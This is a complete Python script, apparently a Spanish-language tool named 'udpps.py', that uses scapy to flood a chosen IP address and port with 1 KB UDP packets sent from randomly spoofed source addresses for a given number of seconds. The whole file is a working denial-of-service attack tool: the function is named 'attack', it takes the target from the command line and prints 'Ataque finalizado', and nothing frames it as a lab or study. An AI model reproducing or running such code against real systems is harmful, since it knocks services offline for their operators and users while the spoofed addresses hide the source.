import sys
import random
import time
from scapy.all import IP, UDP, send

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def attack(target_ip, target_port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        src_ip = random_ip()
        ip = IP(src=src_ip, dst=target_ip)
        udp = UDP(sport=random.randint(1024, 65535), dport=int(target_port))
        payload = b"X" * 1024
        packet = ip/udp/payload
        send(packet, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python udpps.py <IP> <PUERTO> <TIEMPO_SEGUNDOS>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    duration = int(sys.argv[3])

    print(f"...")
    attack(target_ip, target_port, duration)
    print("Ataque finalizado.")
